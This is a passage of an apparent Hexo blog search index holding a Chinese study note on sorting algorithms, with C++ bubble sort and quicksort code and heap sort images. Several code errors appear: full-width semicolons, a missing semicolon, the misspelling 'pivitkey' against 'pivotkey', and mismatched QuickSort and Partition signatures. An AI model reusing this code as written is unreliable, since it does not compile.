<h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><p><strong>基本思想：两两比较相邻记录的关键码，如果反序则交换，直到没有反序的记录为止。</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BubbleSort</span> <span class="params">(T V[], <span class="keyword">int</span> n )</span> </span>&#123;</span><br><span class="line">   <span class="keyword">bool</span> exchange ;   <span class="keyword">int</span> i , j ;</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">	exchange = <span class="literal">false</span>;		 <span class="comment">//标志为0假定未交换</span></span><br><span class="line">	<span class="keyword">for</span> (j=n<span class="number">-1</span>;j&gt;= i；j--)     </span><br><span class="line"> 		<span class="keyword">if</span> (V[j<span class="number">-1</span>]&gt;V[j]) &#123; 	<span class="comment">//逆序</span></span><br><span class="line">                T temp=V[j<span class="number">-1</span>];  V[j<span class="number">-1</span>]=V[j]; V[j]=temp<span class="comment">//交换</span></span><br><span class="line">	            exchange = <span class="literal">true</span>;      <span class="comment">//标志置为1,有交换</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="keyword">if</span>(exchange==<span class="literal">false</span>) <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p><strong>基本思想：取待排序序列中一个元素作为基准，按照该元素的排序码的大小，将整个元素分为左右两个子序列，左侧都小于该排序码，右侧都大于。然后，重复实行这个方法，直到序列有序。</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703204842947.png" alt="image-20200703204842947"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//快速排序的算法</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">QuickSort</span> (<span class="title">dataList</span>&lt;T&gt;&amp; <span class="title">L</span>,  <span class="title">int</span> <span class="title">left</span>,  <span class="title">int</span> <span class="title">right</span>) </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">//对Vector[left..right]进行排</span></span><br><span class="line"><span class="keyword">if</span> (left &lt; right) &#123;		<span class="comment">//元素序列长度大于1时</span></span><br><span class="line">        <span class="keyword">int</span> pivotpos = L.Partition (left, right);    <span class="comment">//划分</span></span><br><span class="line">        QuickSort (L, left, pivotpos<span class="number">-1</span>);</span><br><span class="line">        QuickSort (L, pivotpos+<span class="number">1</span>, right);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;；</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Partition</span><span class="params">( SqList &amp;L,  <span class="keyword">int</span> low,  <span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    L.r[<span class="number">0</span>] = L.r[low];</span><br><span class="line">    pivitkey = L.r[low].key;</span><br><span class="line">    <span class="keyword">while</span>( low &lt; high)&#123;</span><br><span class="line">         <span class="keyword">while</span>( low &lt; high &amp;&amp; L.r[high].key &gt;= pivotkey)  --high;</span><br><span class="line">         L.r[low] = L.r[high];</span><br><span class="line">         <span class="keyword">while</span>( low &lt; high &amp;&amp; L.r[low].key &lt;= pivotkey)  ++low;</span><br><span class="line">         L.r[high] = L.r[low];</span><br><span class="line">    &#125;</span><br><span class="line">    L.r[low] = L.r[<span class="number">0</span>];   </span><br><span class="line">    <span class="keyword">return</span> low;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>快速排序是一种不稳定的排序算法</strong></p>
<h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223906279.png" alt="image-20200703223906279"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223916193.png" alt="image-20200703223916193"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223926277.png" alt="image-20200703223926277"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223943434.png" alt="image-20200703223943434"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223950979.png" alt="image-20200703223950979"></p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>复习</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>我的第一篇博客</title>
    <url>/2020/06/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p>2020/6/27 我的第一篇博客</p>
]]></content>
  </entry>
</search>
